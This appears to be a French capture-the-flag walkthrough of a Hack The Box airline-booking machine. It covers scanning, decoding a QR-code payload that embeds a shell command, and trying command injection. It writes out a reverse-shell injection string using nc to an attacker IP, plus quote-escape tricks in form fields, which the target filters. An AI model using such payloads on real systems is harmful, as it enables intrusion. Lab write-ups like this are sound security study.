# User flag
```bash
$ nmap 10.129.83.224 -sCV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
On a donc affaire un à du web pour commencer.
On crée un compte avec une adresse mail et un mdp pour voir ce qui se cache de l'autre côté de la page d'accueil, sans informations pour nous.
![](assets/Pasted%20image%2020261101130448.png)
Avec ce cookie de connexion, on fait un `dirb` et en parallèle une analyse avec `nuclei` :
```bash
$ dirb http://10.129.83.224/ -X .php,,.html -H "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJleHAiOjE3OTM2MjEwNTIsImlhdCI6MTc5MzUzNDY1MiwiaXNzIjoidGFrZW9mZi5odGIifQ.HqTkC1Htv9G4ikWD4l1DsibzlEkUndoQ1803a4y8e0I"

---- Scanning URL: http://10.129.83.224/ ----
+ http://10.129.83.224/boards (CODE:200|SIZE:37477)
+ http://10.129.83.224/dashboard (CODE:200|SIZE:18994)
+ http://10.129.83.224/logout (CODE:303|SIZE:0)
+ http://10.129.83.224/notifications (CODE:200|SIZE:13053)
+ http://10.129.83.224/profile (CODE:200|SIZE:17709)
+ http://10.129.83.224/search (CODE:200|SIZE:20697)
+ http://10.129.83.224/sign-up (CODE:200|SIZE:2577)
+ http://10.129.83.224/static (CODE:301|SIZE:0)
# Rien de nouveau qu'on ne peut pas atteindre en surfant le site

$ nuclei -update-templates
$ nuclei -u http://10.129.83.224/ -H "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJleHAiOjE3OTM2MjEwNTIsImlhdCI6MTc5MzUzNDY1MiwiaXNzIjoidGFrZW9mZi5odGIifQ.HqTkC1Htv9G4ikWD4l1DsibzlEkUndoQ1803a4y8e0I" -o results.txt
# Aucune faille trouvée
```
On s'intéresse alors à tous les POST à notre disposition :
```
/sign-up
	name=Helo
	email=maxence.c972%40gmail.com
	password=azertyuiop
	terms=on
/sign-in
	email=maxence.c972%40gmail.com
	password=azertyuiop
	remember=on
/payment-cards
	pan=424242424242424242
	cardholder_name=Helo%20Oleh
	exp_month=10
	exp_year=2030
/profile/password
	current_password=azertyuiop
	new_password=poiuytreza
/book/start
	schedule_id=4974
	seat_ids=80
/book/DFR5EW/passengers
	full_name=Helo%20Oleg
	dob=2026-11-03
	id_type=national_id
	id_number=676767
/book/DFR5EW/payment
	payment_card_id=1
```
Après avoir réservé un voyage, on obtient un QR Code, on peut ajouter des notes et télécharger le billet.
![](assets/Pasted%20image%2020261101153911.png)
 Voici le contenu du QR Code :
```
ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5fwMBARhWZXJpZnlUaWNrZXRBdXRoZW50aWNpdHkB/4AAAQEBBERhdGEBCgAAAP+y/4D/rgH/qnsiUE5SIjoiREZSNUVXIiwiVG9rZW4iOiIxYzAxNmIyOGE4YzFmNzEyMTUxZWNmMzAwOWY4Y2Y3NyIsIlNlYXQiOiIyMEQiLCJQYXNzZW5nZXIiOiJIZWxvIE9sZWciLCJOb3RpZnlDbWQiOiJjaGVjay1pbi1ub3RpZnkgLS1wbnIgREZSNUVXIC0tZW1haWwgbWF4ZW5jZS5jOTcyQGdtYWlsLmNvbSJ9AHDX7rzyINXHj/6gUF9f+9zhATp3m3x5f1elH4ugCzP3
```
qui donne décodé, entre des caractères binaires :
```json
{
	"PNR":"DFR5EW",
	"Token":"1c016b28a8c1f712151ecf3009f8cf77",  // Le même que sur le site
	"Seat":"20D",
	"Passenger":"Helo Oleg",
	"NotifyCmd":"check-in-notify --pnr DFR5EW --email maxence.c972@gmail.com"
}
```
On peut ajouter des notes, ce qui envoie une requête POST avec le paramètre `notes=I%20add%20notes`. Quand on télécharge le billet, on obtient un PDF, avec à l'intérieur les notes que l'on a ajoutées.
> Est-ce qu'on peut effectuer une RCE avec ces notes, via la création du PDF ?

Pour le savoir, il faut connaître l'outil utilisé et s'il possède une faille. Dans les métadonnées (`pdfinfo billet.pdf`), on voit que le PDF a été créé par l'outil **FPDF 1.7**. La seule vulnérabilité concernune RCE avec un fichier de font, auquel nous n'avons pas du tout accès pour l'instant.
Le champ de notes ets échappé, ce qui empêche des injections directement, mais on peut essayer sur les autres champs.

On peut effectuer le check-in directement en ligne. Quand on fait le check-in, on a vu dans le QR code que la commande suivante est executée :
```bash
$ check-in-notify --pnr 5RGFH4 --email maxence.c972@gmail.com
```
On peut alors se créer un nouveau compte avec une adresse email spéciale, pour se créer un remote shell.
```
john.doe@gmail.com; nc 10.10.14.158 4444 -e /bin/sh
john%2Edoe%40gmail%2Ecom%3B%20nc%2010%2E10%2E14%2E158%204444%20%2De%20%2Fbin%2Fsh
```
L'adresse craftée n'est pas acceptée. On ne peut pas non plus modifier l'adresse mail dans le profil.
On d'avoir le même résultat avec le nom indiqué pour le passager, avec un échappement par `john"john` ; filtré également. On essaie avec `john%2522john` :
```POST
full_name=john%2522john
dob=2004-10-20
id_type=national_id
id_number=6616116
```
Mais on obtient juste `john%22john` dans le JSON.

